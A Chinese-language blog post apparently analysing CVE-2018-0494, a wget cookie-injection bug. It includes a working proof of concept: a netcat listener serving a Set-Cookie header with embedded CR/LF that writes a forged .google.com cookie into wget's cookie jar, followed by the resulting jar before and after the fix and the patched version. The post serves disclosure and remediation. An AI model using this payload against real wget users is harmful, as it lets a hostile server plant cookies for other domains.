---
title: cve-2018-0494分析
date: 2022-03-09 14:16:09
tags:
- cve
---

### cve编号

CVE-2018-0494

### 漏洞编号

NFS-SA-202203-0001

### 漏洞原因

老版本wget的http.c中，set-cookie代码没有对 \n 和 \r做检查，可以被恶意网站将\r\n 写入到cookie jar中，在使用wget进行下载时 随意生成cookie。

### 复现方法

先设置一个小型网络服务

```
wky@wky-virtual-machine:~/poc/fix$ echo -ne 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\nSet-Cookie: foo="bar\r\n\x20.google.com\tTRUE\t/\tFALSE\t1900000000\tinjected\tcookie\r\n\t";expires=Thursday, 01-Jan-2032 08:00:00 GMT\r\n\r\n' | nc -v -l 7777
Listening on [0.0.0.0] (family 0, port 7777)

```

 使用wget获取恶意网址

```
wky@wky-virtual-machine:~$ wget --save-cookies jar.txt http://127.0.0.1:7777/plop
--2022-03-09 15:00:09--  http://127.0.0.1:7777/plop
正在连接 127.0.0.1:7777... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：0
正在保存至: “plop.1”

plop.1                  [ <=>                ]       0  --.-KB/s    in 0s

2022-03-09 15:00:09 (0.00 B/s) - 已保存 “plop” [0/0])
```

有漏洞的wget执行后，获取到的jar.txt内容为

```
wky@wky-virtual-machine:~$ cat jar.txt
# HTTP cookie file.
# Generated by Wget on 2022-03-09 15:01:53.
# Edit at your own risk.

127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	"bar
 .google.com	TRUE	/	FALSE	1900000000	injected	cookie
	"
wky@wky-virtual-machine:~$
```

修复漏洞之后的结果为

```
wky@wky-virtual-machine:~$ cat jar.txt
# HTTP cookie file.
# Generated by Wget on 2022-03-09 15:00:09.
# Edit at your own risk.

127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	"bar   .google.com	TRUE	/	FALSE	1900000000	injected	cookie  	"
wky@wky-virtual-machine:~$
```

可以看到修复之后，获取的cookie为一行，而存在漏洞的wget获取的cookie被恶意网址修改成为了两行。

### 修复方法

将wget升级到 wget_1.18-5+deb9u3版本即可。
